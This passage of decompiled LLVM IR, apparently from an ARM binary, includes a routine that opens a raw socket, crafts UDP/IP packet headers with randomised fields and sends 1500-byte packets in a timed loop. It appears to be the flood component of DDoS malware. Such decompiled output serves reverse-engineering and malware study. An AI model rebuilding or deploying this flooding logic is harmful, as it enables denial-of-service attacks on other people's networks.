  %v2_9970 = icmp eq i8 %v2_996c, 0
  br i1 %v2_9970, label %dec_label_pc_9978, label %dec_label_pc_998c

dec_label_pc_9978:                                ; preds = %dec_label_pc_9968
  store i32 %arg2, i32* @r2, align 4
  %v3_9984 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_15440.102 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_998c:                                ; preds = %dec_label_pc_9968
  %v1_9990 = add i32 %arg4, 4
  %v1_9994 = inttoptr i32 %v1_9990 to i32*
  %v2_9994 = load i32, i32* %v1_9994, align 4
  %v3_99a0 = call i32 @function_f464(i8* bitcast (i32* @global_var_1aaf0.92 to i8*), i32 %v2_9994)
  %v2_99a8 = icmp eq i32 %v3_99a0, 0
  br i1 %v2_99a8, label %dec_label_pc_99c4, label %dec_label_pc_99b0

dec_label_pc_99b0:                                ; preds = %dec_label_pc_998c
  store i32 %arg2, i32* @r2, align 4
  %v3_99bc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_15460.105 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_99c4:                                ; preds = %dec_label_pc_998c
  store i8 0, i8* bitcast (i8** @global_var_18474.23 to i8*), align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_99dc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1547c.107 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %dec_label_pc_99b0, %dec_label_pc_9978, %dec_label_pc_991c, %dec_label_pc_99c4
  %v9_99e4 = phi i32 [ %v3_99bc, %dec_label_pc_99b0 ], [ %v3_9984, %dec_label_pc_9978 ], [ %v3_9960, %dec_label_pc_991c ], [ %v3_99dc, %dec_label_pc_99c4 ]
  ret i32 %v9_99e4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_1aaf0.92, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_18474.23 to i8*), { 0, 4, 1, 3, 2 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_99e0, { 3, 0, 1, 2 }
}

define i32 @function_9a0c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a0c:
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_9a10 = load i32, i32* @r4, align 4
  store i32 %v3_9a10, i32* %stack_var_-20, align 4
  store i32 39448, i32* %stack_var_-4, align 4
  %v16_9a10 = ptrtoint i32* %stack_var_-20 to i32
  %v2_9a14 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a14, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-304, align 4
  %v7_9a30 = icmp eq i32 %arg3, 1
  br i1 %v7_9a30, label %dec_label_pc_9a64, label %dec_label_pc_9a38

dec_label_pc_9a38:                                ; preds = %dec_label_pc_9a0c
  store i32 %arg2, i32* @r2, align 4
  %v3_9a44 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1549c.109 to i32))
  store i32 0, i32* bitcast (i8** @global_var_18478.33 to i32*), align 4
  store i32 0, i32* @global_var_1847c.35, align 4
  br label %dec_label_pc_9c40

dec_label_pc_9a64:                                ; preds = %dec_label_pc_9a0c
  %v1_9a68 = add i32 %arg4, 4
  %v1_9a6c = inttoptr i32 %v1_9a68 to i32*
  %v2_9a6c = load i32, i32* %v1_9a6c, align 4
  store i32 %v2_9a6c, i32* @r0, align 4
  %v0_9a74 = call i32 @function_f030()
  %tmp = icmp ult i32 %v0_9a74, 17
  br i1 %tmp, label %dec_label_pc_9a98, label %dec_label_pc_9a84

dec_label_pc_9a84:                                ; preds = %dec_label_pc_9a64
  store i32 %arg2, i32* @r2, align 4
  %v3_9a90 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_154bc.113 to i32))
  br label %dec_label_pc_9c40

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9a64
  %v3_9a98 = load i32, i32* %stack_var_-304, align 4
  %v1_9a9c = add i32 %v3_9a98, 4
  %v1_9aa0 = inttoptr i32 %v1_9a9c to i32*
  %v2_9aa0 = load i32, i32* %v1_9aa0, align 4
  %v2_9aa4 = ptrtoint i32* %stack_var_-288 to i32
  %v2_9ab0 = inttoptr i32 %v2_9aa0 to i8*
  %v3_9ab0 = call i32 @function_f090(i32 %v2_9aa4, i8* %v2_9ab0)
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9abc = call i32 @function_f030()
  %v1_9ac4 = add i32 %v16_9a10, -1
  %v2_9ad4 = add i32 %v1_9ac4, %v0_9abc
  %v2_9ad8 = add i32 %v2_9ad4, -268
  %v1_9adc = inttoptr i32 %v2_9ad8 to i8*
  %v2_9adc = load i8, i8* %v1_9adc, align 1
  %v7_9ae0 = icmp eq i8 %v2_9adc, 46
  br i1 %v7_9ae0, label %dec_label_pc_9ae8, label %dec_label_pc_9b68

dec_label_pc_9ae8:                                ; preds = %dec_label_pc_9a98
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9af0 = call i32 @function_f030()
  %v1_9af8 = add i32 %v16_9a10, -269
  %v2_9b0c = add i32 %v1_9af8, %v0_9af0
  %v3_9b14 = inttoptr i32 %v2_9b0c to i8*
  store i8 0, i8* %v3_9b14, align 1
  br label %dec_label_pc_9b68

dec_label_pc_9b2c:                                ; preds = %dec_label_pc_9b68
  %v2_9b3c = add i32 %stack_var_-32.0, %v16_9a10
  %v2_9b40 = add i32 %v2_9b3c, -268
  %v1_9b44 = inttoptr i32 %v2_9b40 to i8*
  %v2_9b44 = load i8, i8* %v1_9b44, align 1
  %v7_9b48 = icmp eq i8 %v2_9b44, 46
  br i1 %v7_9b48, label %dec_label_pc_9b50, label %dec_label_pc_9b5c

dec_label_pc_9b50:                                ; preds = %dec_label_pc_9b2c
  %v1_9b54 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_9b5c

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_9b2c, %dec_label_pc_9b50
  %stack_var_-28.0 = phi i32 [ %v1_9b54, %dec_label_pc_9b50 ], [ %stack_var_-28.1, %dec_label_pc_9b2c ]
  %v1_9b60 = add i32 %stack_var_-32.0, 1
  br label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9ae8, %dec_label_pc_9a98, %dec_label_pc_9b5c
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_9b5c ], [ 1, %dec_label_pc_9a98 ], [ 1, %dec_label_pc_9ae8 ]
  %stack_var_-32.0 = phi i32 [ %v1_9b60, %dec_label_pc_9b5c ], [ 0, %dec_label_pc_9a98 ], [ 0, %dec_label_pc_9ae8 ]
  store i32 %stack_var_-32.0, i32* @r4, align 4
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9b74 = call i32 @function_f030()
  %v0_9b7c = load i32, i32* @r4, align 4
  %v3_9b7c = icmp ult i32 %v0_9b7c, %v0_9b74
  br i1 %v3_9b7c, label %dec_label_pc_9b2c, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9b68
  %v1_9b88 = sub i32 4, %stack_var_-28.1
  %v3_9be022 = icmp eq i32 %v1_9b88, 0
  %v5_9be427 = icmp sgt i32 %v1_9b88, 0
  br i1 %v5_9be427, label %dec_label_pc_9b9c, label %dec_label_pc_9be8

dec_label_pc_9b9c:                                ; preds = %dec_label_pc_9b84, %dec_label_pc_9b9c
  %storemerge228 = phi i32 [ %v1_9bd0, %dec_label_pc_9b9c ], [ 0, %dec_label_pc_9b84 ]
  store i32 %v2_9aa4, i32* @r4, align 4
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9ba8 = call i32 @function_f030()
  %v0_9bb0 = load i32, i32* @r4, align 4
  %v2_9bb0 = add i32 %v0_9bb0, %v0_9ba8
  store i32 %v2_9bb0, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15508.115 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  %v0_9bc8 = call i32 @function_ef60()
  %v1_9bd0 = add nuw nsw i32 %storemerge228, 1
  %v5_9be4 = icmp slt i32 %v1_9bd0, %v1_9b88
  br i1 %v5_9be4, label %dec_label_pc_9b9c, label %dec_label_pc_9be8

dec_label_pc_9be8:                                ; preds = %dec_label_pc_9b9c, %dec_label_pc_9b84
  %v1_9bf0 = call i32 @function_f618(i32 %v2_9aa4)
  br i1 %v3_9be022, label %dec_label_pc_9c34, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9be8
  %v2_9c20 = call i32 @function_8c48(i32 256, i32 %v1_9b88)
  br label %dec_label_pc_9c34

dec_label_pc_9c34:                                ; preds = %dec_label_pc_9be8, %dec_label_pc_9c18
  %storemerge = phi i32 [ %v2_9c20, %dec_label_pc_9c18 ], [ 1, %dec_label_pc_9be8 ]
  %v12_9c447 = phi i32 [ %v2_9c20, %dec_label_pc_9c18 ], [ %v1_9bf0, %dec_label_pc_9be8 ]
  store i32 %storemerge, i32* @global_var_1847c.35, align 4
  store i32 %v1_9bf0, i32* bitcast (i8** @global_var_18478.33 to i32*), align 4
  br label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %dec_label_pc_9a84, %dec_label_pc_9a38, %dec_label_pc_9c34
  %v12_9c44 = phi i32 [ %v3_9a90, %dec_label_pc_9a84 ], [ %v3_9a44, %dec_label_pc_9a38 ], [ %v12_9c447, %dec_label_pc_9c34 ]
  ret i32 %v12_9c44

; uselistorder directives
  uselistorder i32 %v1_9bf0, { 1, 0 }
  uselistorder i32 %v1_9bd0, { 1, 0 }
  uselistorder i32 %v1_9b88, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-32.0, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v16_9a10, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8c48, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9c40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c34, { 1, 0 }
  uselistorder label %dec_label_pc_9b9c, { 1, 0 }
  uselistorder label %dec_label_pc_9b68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9b5c, { 1, 0 }
}

define i32 @function_9c5c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9c5c:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9c60 = load i32, i32* @fp, align 4
  store i32 40040, i32* %stack_var_-4, align 4
  %v2_9c64 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c64, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_9c78 = call i32 @function_f730(i32 %arg2)
  store i32 %v1_9c78, i32* @global_var_18884.117, align 4
  %v3_9c90 = icmp eq i32 %v1_9c78, -1
  br i1 %v3_9c90, label %dec_label_pc_9c98, label %dec_label_pc_9cfc

dec_label_pc_9c98:                                ; preds = %dec_label_pc_9c5c
  %v3_9c98 = load i32, i32* %stack_var_-28, align 4
  %v1_9c9c = call i32 @function_f754(i32 %v3_9c98)
  %v2_9cac = icmp eq i32 %v1_9c9c, 0
  br i1 %v2_9cac, label %dec_label_pc_9cb4, label %dec_label_pc_9cd8

dec_label_pc_9cb4:                                ; preds = %dec_label_pc_9c98
  %v2_9cb8 = load i32, i32* @global_var_1abf8.25, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_9ccc = call i32 @function_8374(i32 %v2_9cb8, i32 ptrtoint ([33 x i8]* @global_var_1550c.120 to i32))
  %v1_9cd4 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_9cd8

dec_label_pc_9cd8:                                ; preds = %dec_label_pc_9c98, %dec_label_pc_9cb4
  %v1_9cdc = add i32 %v1_9c9c, 16
  %v2_9cdc = inttoptr i32 %v1_9cdc to i32*
  %v3_9cdc = load i32, i32* %v2_9cdc, align 4
  %v1_9ce0 = inttoptr i32 %v3_9cdc to i32*
  %v2_9ce0 = load i32, i32* %v1_9ce0, align 4
  %v1_9cec = add i32 %v1_9c9c, 12
  %v2_9cec = inttoptr i32 %v1_9cec to i32*
  %v3_9cec = load i32, i32* %v2_9cec, align 4
  store i32 %v3_9cec, i32* @r2, align 4
  %v3_9cf8 = call i32 @function_ef50(i32 %v2_9ce0, i32 ptrtoint (i32* @global_var_18884.117 to i32), i32 %v3_9cec)
  %v2_9d00.pre = load i32, i32* @global_var_18884.117, align 4
  br label %dec_label_pc_9cfc

dec_label_pc_9cfc:                                ; preds = %dec_label_pc_9c5c, %dec_label_pc_9cd8
  %v2_9d00 = phi i32 [ %v1_9c78, %dec_label_pc_9c5c ], [ %v2_9d00.pre, %dec_label_pc_9cd8 ]
  store i32 %v3_9c60, i32* @fp, align 4
  ret i32 %v2_9d00

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_18884.117, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9cfc, { 1, 0 }
  uselistorder label %dec_label_pc_9cd8, { 1, 0 }
}

define i32 @function_9d1c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9d1c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1544 = alloca i32, align 4
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1572 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40232, i32* %stack_var_-4, align 4
  %v2_9d24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d24, i32* @fp, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9d4c = call i32 @function_ce30(i32* null)
  store i32 %v2_9d4c, i32* %r3.global-to-local, align 4
  %v1_9d5c = call i32 @function_83d8(i32 %arg2)
  store i32 %v1_9d5c, i32* %r3.global-to-local, align 4
  %v2_9d64 = icmp eq i32 %v1_9d5c, 0
  br i1 %v2_9d64, label %dec_label_pc_9d6c, label %dec_label_pc_a100

dec_label_pc_9d6c:                                ; preds = %dec_label_pc_9d1c
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 255, i32* %r2.global-to-local, align 4
  %v3_9d78 = call i32 @function_fc4c(i32 2, i32 3, i32 255)
  store i32 %v3_9d78, i32* %r3.global-to-local, align 4
  %v1_9d88 = icmp slt i32 %v3_9d78, 0
  br i1 %v1_9d88, label %dec_label_pc_9d90, label %dec_label_pc_9d98

dec_label_pc_9d90:                                ; preds = %dec_label_pc_9d6c
  %v1_9d94 = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_9d98

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9d6c, %dec_label_pc_9d90
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v8_9da0 = icmp sgt i32 %arg3, 2
  br i1 %v8_9da0, label %dec_label_pc_9dbc, label %dec_label_pc_9da4

dec_label_pc_9da4:                                ; preds = %dec_label_pc_9d98
  store i32 ptrtoint ([39 x i8]* @global_var_15530.122 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9db0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_15530.122 to i32))
  %v1_9db8 = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_9dbc

dec_label_pc_9dbc:                                ; preds = %dec_label_pc_9d98, %dec_label_pc_9da4
  %v1_9dc0 = add i32 %arg4, 4
  store i32 %v1_9dc0, i32* %r3.global-to-local, align 4
  %v1_9dc4 = inttoptr i32 %v1_9dc0 to i32*
  %v2_9dc4 = load i32, i32* %v1_9dc4, align 4
  store i32 %v2_9dc4, i32* %r3.global-to-local, align 4
  store i32 %v2_9dc4, i32* %r1.global-to-local, align 4
  %v2_9dd0 = call i32 @function_9c5c(i32 %arg2, i32 %v2_9dc4)
  %v1_9de0 = add i32 %arg4, 8
  store i32 %v1_9de0, i32* %r3.global-to-local, align 4
  %v1_9de4 = inttoptr i32 %v1_9de0 to i32*
  %v2_9de4 = load i32, i32* %v1_9de4, align 4
  store i32 %v2_9de4, i32* %r3.global-to-local, align 4
  %v1_9dec = inttoptr i32 %v2_9de4 to i8*
  %v2_9dec = call i32 @function_10868(i8* %v1_9dec)
  %v1_9dfc = add i32 %arg4, 12
  store i32 %v1_9dfc, i32* %r3.global-to-local, align 4
  %v1_9e00 = inttoptr i32 %v1_9dfc to i32*
  %v2_9e00 = load i32, i32* %v1_9e00, align 4
  store i32 %v2_9e00, i32* %r3.global-to-local, align 4
  %v1_9e08 = inttoptr i32 %v2_9e00 to i8*
  %v2_9e08 = call i32 @function_10868(i8* %v1_9e08)
  %v2_9e1c = ptrtoint i32* %stack_var_-1572 to i32
  %tmp42 = bitcast i32* %stack_var_-1572 to i8*
  %tmp43 = bitcast i32* %stack_var_-1552 to i8*
  %v2_9e44 = ptrtoint i32* %stack_var_-1544 to i32
  store i32 %v2_9e44, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 1472, i32* @r2, align 4
  %v2_9e58 = bitcast i32* %stack_var_-1544 to i8*
  %v3_9e58 = call i32 @function_ef70(i8* %v2_9e58, i32 10)
  store i32 %v1_9dc0, i32* %r3.global-to-local, align 4
  %v2_9e64 = load i32, i32* %v1_9dc4, align 4
  store i32 %v2_9e64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_15558.124 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9e74 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_15558.124 to i32))
  store i8 69, i8* %tmp42, align 4
  %v3_9ec8 = or i32 %v2_9e1c, 1
  %v4_9ec8 = inttoptr i32 %v3_9ec8 to i8*
  store i8 0, i8* %v4_9ec8, align 1
  store i32 %v2_9e1c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v3_9ed8 = or i32 %v2_9e1c, 2
  %v4_9ed8 = inttoptr i32 %v3_9ed8 to i8*
  store i8 -36, i8* %v4_9ed8, align 2
  %v0_9edc = load i32, i32* %r2.global-to-local, align 4
  %v1_9edc = trunc i32 %v0_9edc to i8
  %v2_9edc = load i32, i32* %r1.global-to-local, align 4
  %v3_9edc = add i32 %v2_9edc, 3
  %v4_9edc = inttoptr i32 %v3_9edc to i8*
  store i8 %v1_9edc, i8* %v4_9edc, align 1
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9ee8 = add i32 %v2_9e1c, 6
  %v4_9ee8 = inttoptr i32 %v3_9ee8 to i8*
  store i8 0, i8* %v4_9ee8, align 2
  %v0_9eec = load i32, i32* %r3.global-to-local, align 4
  %v1_9eec = trunc i32 %v0_9eec to i8
  %v2_9eec = load i32, i32* %r2.global-to-local, align 4
  %v3_9eec = add i32 %v2_9eec, 7
  %v4_9eec = inttoptr i32 %v3_9eec to i8*
  store i8 %v1_9eec, i8* %v4_9eec, align 1
  %v3_9ef8 = add i32 %v2_9e1c, 9
  %v4_9ef8 = inttoptr i32 %v3_9ef8 to i8*
  store i8 17, i8* %v4_9ef8, align 1
  %v3_9f04 = add i32 %v2_9e1c, 8
  %v4_9f04 = inttoptr i32 %v3_9f04 to i8*
  store i8 64, i8* %v4_9f04, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v2_9f10 = add i32 %v2_9e1c, 16
  %v3_9f10 = inttoptr i32 %v2_9f10 to i32*
  store i32 %v2_9dd0, i32* %v3_9f10, align 4
  %v3_9f1c = urem i32 %tmp13, 65536
  store i32 %v3_9f1c, i32* %r3.global-to-local, align 4
  %v1_9f24 = call i32 @function_f604(i32 %v3_9f1c)
  %sext = mul i32 %v1_9f24, 16777216
  %v1_9f28 = sdiv i32 %sext, 16777216
  store i32 %v1_9f28, i32* %r3.global-to-local, align 4
  %v4_9f2c = ptrtoint i32* %stack_var_-1552 to i32
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f30 = trunc i32 %v1_9f28 to i8
  %v3_9f30 = add i32 %v4_9f2c, 4
  %v4_9f30 = inttoptr i32 %v3_9f30 to i8*
  store i8 %v1_9f30, i8* %v4_9f30, align 4
  %v0_9f34 = load i32, i32* %r3.global-to-local, align 4
  %v3_9f347 = udiv i32 %v0_9f34, 256
  %v1_9f38 = trunc i32 %v3_9f347 to i8
  %v2_9f38 = load i32, i32* %r2.global-to-local, align 4
  %v3_9f38 = add i32 %v2_9f38, 5
  %v4_9f38 = inttoptr i32 %v3_9f38 to i8*
  store i8 %v1_9f38, i8* %v4_9f38, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v2_9f78 = icmp eq i32 %v2_9dec, 0
  %v3_9fc0 = or i32 %v4_9f2c, 2
  %v4_9fc0 = inttoptr i32 %v3_9fc0 to i8*
  %v3_9ff0 = add i32 %v4_9f2c, 6
  %v4_9ff0 = inttoptr i32 %v3_9ff0 to i8*
  %v2_a008 = add i32 %v2_9e1c, 12
  %v3_a008 = inttoptr i32 %v2_a008 to i32*
  %v3_a020 = add i32 %v2_9e1c, 4
  %v4_a020 = inttoptr i32 %v3_a020 to i8*
  %v3_a050 = add i32 %v2_9e1c, 10
  %v4_a050 = inttoptr i32 %v3_a050 to i8*
  %v2_a07c = ptrtoint i32* %stack_var_-72 to i32
  %v2_a0d4 = add i32 %v2_9e08, %v2_9d4c
  %v3_9f88 = urem i32 %v2_9dec, 65536
  %v3_9f70 = or i32 %v4_9f2c, 1
  %v4_9f70 = inttoptr i32 %v3_9f70 to i8*
  br label %dec_label_pc_9f54

dec_label_pc_9f54:                                ; preds = %dec_label_pc_a0f0, %dec_label_pc_9dbc
  %storemerge = phi i32 [ %v2_9dd0, %dec_label_pc_9dbc ], [ %v1_a0f4, %dec_label_pc_a0f0 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_9dbc ], [ %v1_a0f4, %dec_label_pc_a0f0 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_9f54 = call i32 @function_10364()
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f68 = trunc i32 %v0_9f54 to i8
  store i8 %v1_9f68, i8* %tmp43, align 4
  %v3_9f60 = udiv i32 %v0_9f54, 256
  %v1_9f70 = trunc i32 %v3_9f60 to i8
  store i8 %v1_9f70, i8* %v4_9f70, align 1
  store i32 %v2_9dec, i32* %r3.global-to-local, align 4
  br i1 %v2_9f78, label %dec_label_pc_9fac, label %dec_label_pc_9f80

dec_label_pc_9f80:                                ; preds = %dec_label_pc_9f54
  store i32 %v3_9f88, i32* %r3.global-to-local, align 4
  %v1_9f90 = call i32 @function_f604(i32 %v3_9f88)
  %sext3 = mul i32 %v1_9f90, 16777216
  %v1_9f94 = sdiv i32 %sext3, 16777216
  store i32 %v1_9f94, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f9c = trunc i32 %v1_9f94 to i8
  store i8 %v1_9f9c, i8* %v4_9fc0, align 2
  %v0_9fa0 = load i32, i32* %r3.global-to-local, align 4
  %v3_9fa0 = sdiv i32 %v0_9fa0, 256
  store i32 %v3_9fa0, i32* %r3.global-to-local, align 4
  %v1_9fa4 = trunc i32 %v3_9fa0 to i8
  %v2_9fa4 = load i32, i32* %r2.global-to-local, align 4
  %v3_9fa4 = add i32 %v2_9fa4, 3
  %v4_9fa4 = inttoptr i32 %v3_9fa4 to i8*
  store i8 %v1_9fa4, i8* %v4_9fa4, align 1
  br label %dec_label_pc_9fcc

dec_label_pc_9fac:                                ; preds = %dec_label_pc_9f54
  %v0_9fac = call i32 @function_10364()
  %v3_9fb8 = urem i32 %v0_9fac, 65536
  store i32 %v3_9fb8, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9fc0 = trunc i32 %v0_9fac to i8
  store i8 %v1_9fc0, i8* %v4_9fc0, align 2
  %v0_9fc4 = load i32, i32* %r3.global-to-local, align 4
  %v3_9fc4 = sdiv i32 %v0_9fc4, 256
  store i32 %v3_9fc4, i32* %r3.global-to-local, align 4
  %v1_9fc8 = trunc i32 %v3_9fc4 to i8
  %v2_9fc8 = load i32, i32* %r2.global-to-local, align 4
  %v3_9fc8 = add i32 %v2_9fc8, 3
  %v4_9fc8 = inttoptr i32 %v3_9fc8 to i8*
  store i8 %v1_9fc8, i8* %v4_9fc8, align 1
  br label %dec_label_pc_9fcc

dec_label_pc_9fcc:                                ; preds = %dec_label_pc_9f80, %dec_label_pc_9fac
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 1500, i32* %r1.global-to-local, align 4
  %v3_9fe4 = call i32 @function_8cc4(i8* %tmp42, i32 1500)
  %sext4 = mul i32 %v3_9fe4, 16777216
  %v1_9fe8 = sdiv i32 %sext4, 16777216
  store i32 %v1_9fe8, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9ff0 = trunc i32 %v1_9fe8 to i8
  store i8 %v1_9ff0, i8* %v4_9ff0, align 2
  %v0_9ff4 = load i32, i32* %r3.global-to-local, align 4
  %v3_9ff4 = sdiv i32 %v0_9ff4, 256
  store i32 %v3_9ff4, i32* %r3.global-to-local, align 4
  %v1_9ff8 = trunc i32 %v3_9ff4 to i8
  %v2_9ff8 = load i32, i32* %r2.global-to-local, align 4
  %v3_9ff8 = add i32 %v2_9ff8, 7
  %v4_9ff8 = inttoptr i32 %v3_9ff8 to i8*
  store i8 %v1_9ff8, i8* %v4_9ff8, align 1
  %v0_9ffc = call i32 @function_8548()
  store i32 %v0_9ffc, i32* %r2.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 %v0_9ffc, i32* %v3_a008, align 4
  %v0_a00c = call i32 @function_10364()
  %v3_a018 = urem i32 %v0_a00c, 65536
  store i32 %v3_a018, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v1_a020 = trunc i32 %v0_a00c to i8
  store i8 %v1_a020, i8* %v4_a020, align 4
  %v0_a024 = load i32, i32* %r3.global-to-local, align 4
  %v3_a0248 = udiv i32 %v0_a024, 256
  %v1_a028 = trunc i32 %v3_a0248 to i8
  %v2_a028 = load i32, i32* %r2.global-to-local, align 4
  %v3_a028 = add i32 %v2_a028, 5
  %v4_a028 = inttoptr i32 %v3_a028 to i8*
  store i8 %v1_a028, i8* %v4_a028, align 1
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 1500, i32* %r1.global-to-local, align 4
  %v3_a044 = call i32 @function_8cc4(i8* %tmp42, i32 1500)
  %sext5 = mul i32 %v3_a044, 16777216
  %v1_a048 = sdiv i32 %sext5, 16777216
  store i32 %v1_a048, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v1_a050 = trunc i32 %v1_a048 to i8
  store i8 %v1_a050, i8* %v4_a050, align 2
  %v0_a054 = load i32, i32* %r3.global-to-local, align 4
  %v3_a0549 = udiv i32 %v0_a054, 256
  %v1_a058 = trunc i32 %v3_a0549 to i8
  %v2_a058 = load i32, i32* %r2.global-to-local, align 4
  %v3_a058 = add i32 %v2_a058, 11
  %v4_a058 = inttoptr i32 %v3_a058 to i8*
  store i8 %v1_a058, i8* %v4_a058, align 1
  store i32 %v3_9fc0, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r1.global-to-local, align 4
  store i32 1500, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_a0ac = call i32 @function_fbe8(i32 %v3_9d78, i32* nonnull %stack_var_-1572, i32 1500, i32 0, i32 %v2_a07c, i32 16)
  store i32 %stack_var_-52.0, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i32 %stack_var_-52.0, 50
  br i1 %tmp, label %dec_label_pc_a0f0, label %dec_label_pc_a0bc

dec_label_pc_a0bc:                                ; preds = %dec_label_pc_9fcc
  %v2_a0c0 = call i32 @function_ce30(i32* null)
  store i32 %v2_a0c0, i32* %r1.global-to-local, align 4
  store i32 %v2_9d4c, i32* %r2.global-to-local, align 4
  store i32 %v2_a0d4, i32* %r3.global-to-local, align 4
  %v3_a0d8 = icmp ult i32 %v2_a0c0, %v2_a0d4
  br i1 %v3_a0d8, label %dec_label_pc_a0e8, label %dec_label_pc_a0e0

dec_label_pc_a0e0:                                ; preds = %dec_label_pc_a0bc
  %v1_a0e4 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_a0e8

